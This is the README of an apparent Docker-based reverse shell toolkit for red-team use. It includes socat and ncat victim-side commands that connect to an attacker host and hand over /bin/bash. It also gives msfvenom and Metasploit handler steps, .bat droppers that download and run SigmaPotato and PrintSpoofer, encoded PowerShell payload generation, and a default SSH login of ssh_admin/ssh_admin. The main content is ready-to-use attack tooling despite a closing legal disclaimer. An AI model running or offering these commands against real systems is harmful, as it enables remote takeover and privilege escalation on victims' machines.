# 🐚 Docker Reverse Shell Toolkit

![Docker Logo](https://www.docker.com/wp-content/uploads/2022/03/horizontal-logo-monochromatic-white.png)

This project provides a **simple and modular Bash-based Reverse Shell Docker container** for penetration testing and red team simulations. It allows you to spawn reverse shells with ease and minimal setup. Output and logs are mounted to host for easy access.

---

## ✨ Features

- 🧾 Auto-generated `.bat` droppers with runtime IP/Port injection
- 🌐 Web UI for live payload generation (`payload_generator.html`)
- ⚙️ CLI-based dynamic reverse shell generator with output log
- 🔐 HTTPS server using NGINX with self-signed TLS
- 🧪 Payloads for:
  - PowerShell (encoded)
  - SigmaPotato
  - PrintSpoofer
  - ncat / socat / msfvenom
- 📦 Docker Volumes for logs and payloads
- 🔐 SSH access (user: `ssh_admin`, pass: `ssh_admin`, port: `2222`)

---

## 🧱 Build the Docker Image

```bash
docker build -t reverse-shell .
```

---

## 🧪 Run the Container

```bash
  -p 8080:8080 \
docker run -it --rm \
  -v $(pwd)/logs:/app/logs \
  -v $(pwd)/www:/usr/share/nginx/html \
  -p 443:443 -p 4444:4444 -p 5555:5555 -p 2222:2222 \
  reverse-shell
```

---

## 🔐 Access Details

| Service        | Access Info                                     |
|----------------|-------------------------------------------------|
| HTTPS Payloads | https://<your_ip>/                              |
| Web Generator  | https://<your_ip>/payload_generator.html        |
| SSH Access     | ssh ssh_admin@<your_ip> -p 2222 (pw: ssh_admin) |

---

## 🧾 Payload Generator (Web UI)

📍 Visit:  
```
https://<your_ip>/payload_generator.html
```

📥 Input your IP and Port.  
🔐 It dynamically shows:

- Base64-encoded PowerShell
- SigmaPotato
- PrintSpoofer

---

## 🔧 CLI-Based Generator

When the container starts, it will prompt you for:

- Your Attacker IP
- Your Listening Port

This will:

- Generate encoded PowerShell payloads
- Output payloads to `/usr/share/nginx/html/reverse_payloads.txt`
- Print to screen

---

## 🧷 Auto-Generated `.bat` Files

These are served from the container's `/usr/share/nginx/html`:

- `auto_sigma_https.bat`  
  ➤ Downloads and executes SigmaPotato over HTTPS

- `auto_printspoofer_https.bat`  
  ➤ Downloads PrintSpoofer and injects encoded PowerShell

Update IP and Port inside `.bat` manually or regenerate with the CLI.

---

## 🧬 Additional Payload Examples

### 🔹 Socat (encrypted shell)

**Attacker:**
```bash
socat openssl-listen:4444,reuseaddr,fork,cert=cert.pem,key=key.pem,verify=0 -
```

**Victim:**
```bash
socat openssl:attacker_ip:4444,verify=0 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

### 🔹 Ncat (SSL reverse shell)

**Attacker:**
```bash
ncat -lvnp 5555 --ssl
```

**Victim:**
```bash
ncat --ssl attacker_ip 5555 -e /bin/bash
```

---

### 🔹 MSFVenom Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f exe > www/rev_shell.exe
```

**Start Listener:**
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST <your_ip>
set LPORT 4444
run
```

---

## 🔐 HTTPS Support (NGINX)

Built-in HTTPS support using NGINX and a self-signed cert:

- Mounted at: `/etc/nginx/cert.pem` and `/etc/nginx/key.pem`
- Default TLS port: `443`
- Hosts everything in `/usr/share/nginx/html`

---

## 🗂 Docker Volumes

| Host Folder | Container Mount Path         | Purpose               |
|-------------|------------------------------|------------------------|
| `./logs`    | `/app/logs`                  | Output logs            |
| `./www`     | `/usr/share/nginx/html`      | Web payload hosting    |

---

## ⚠️ Legal Disclaimer

> This toolkit is intended **for authorized testing only**.  
> Unauthorized use is illegal and unethical.  
> Always get written permission before testing any system you do not own.

---

## 🌐 Optional HTTP Access (Port 8080)

Although HTTPS (443) is preferred, this toolkit also exposes port **8080** for plain HTTP delivery if needed.

This is helpful for:
- Legacy tools
- Targets without trusted cert support
- Quick testing without TLS overhead

**Usage:**
```bash
http://<your_ip>:8080/SigmaPotato.exe
http://<your_ip>:8080/auto_sigma_https.bat
```

Mount the port:
```bash
-p 8080:8080
```

To start a plain HTTP server manually inside the container:
```bash
python3 -m http.server 8080 --directory /usr/share/nginx/html
```

**Reminder:** Plain HTTP is unencrypted and should only be used in controlled environments.
